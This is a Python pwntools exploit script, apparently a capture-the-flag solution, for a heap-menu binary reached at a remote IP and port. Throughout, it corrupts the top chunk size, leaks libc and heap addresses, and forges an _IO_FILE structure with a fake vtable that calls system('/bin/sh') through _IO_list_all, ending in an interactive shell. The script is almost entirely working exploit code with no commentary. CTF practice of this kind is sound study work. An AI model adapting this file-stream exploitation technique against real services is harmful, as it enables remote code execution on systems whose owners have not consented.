#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./pwn')
p = remote('182.92.203.154', 28452)

def add(idx, size, payload):
  p.sendlineafter('>>', '1')
  p.sendlineafter('Please enter the wind turbine to be turned on(0 ~ 5):', str(idx))
  p.sendlineafter('Please input the maximum power of this wind turbine:', str(size))
  p.sendafter('Your name:', payload)


def edit(idx, payload):
  p.sendlineafter('>>', '3')
  p.sendlineafter('Which turbine:', str(idx))
  p.sendafter('Please input:', payload)

def show(idx):
  p.sendlineafter('>>', '2')
  p.sendlineafter('Please select the number of the wind turbine to be viewed:', str(idx))

def pack_file_64(_flags=0,
                 _IO_read_ptr=0,
                 _IO_read_end=0,
                 _IO_read_base=0,
                 _IO_write_base=0,
                 _IO_write_ptr=0,
                 _IO_write_end=0,
                 _IO_buf_base=0,
                 _IO_buf_end=0,
                 _IO_save_base=0,
                 _IO_backup_base=0,
                 _IO_save_end=0,
                 _IO_marker=0,
                 _IO_chain=0,
                 _fileno=0,
                 _lock=0,
                 _mode=0):
    struct = _flags + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0, "\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct

if __name__ == "__main__":
  add(0, 0x400 - 0x10, 'Mech0n\n')
  edit(0, '\x00' * 0x3f8 + p64(0xc01))
  add(1, 0x1000 - 1, 'Mech0n\n')
  add(2, 0x400, 'a' * 8)
  show(2)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c5158
  IO_list_all = libc + 0x3c5520
  system = libc + 0x453a0
  sh = libc + 0x18ce17
  fd = libc + 0x3c4b78

  edit(2, 'a' * 0x11)
  show(2)
  p.recvuntil('a' * 0x10)
  heap = u64(p.recv(6).ljust(8, '\x00')) - 0x61 #heap2

  vtable_addr = heap + 0x500
  payload = '\x00' * 0x400
  fake_file = pack_file_64(
    _flags='/bin/sh\x00',
    _IO_read_ptr= 0x61,
    _IO_read_end= fd,
    _IO_read_base= IO_list_all - 0x10,
    _mode=0,
    _IO_write_base=2,
    _IO_write_ptr=3
    )
  payload += fake_file
  payload += p64(vtable_addr)
  payload += p64(1)
  payload += p64(2)
  payload += p64(0)*3   # vtable
  payload += p64(system)

  edit(2, payload)

  success('LIBC:\t' + str(hex(libc)))
  success('HEAP:\t' + str(hex(heap)))
  # gdb.attach(p)
  p.interactive()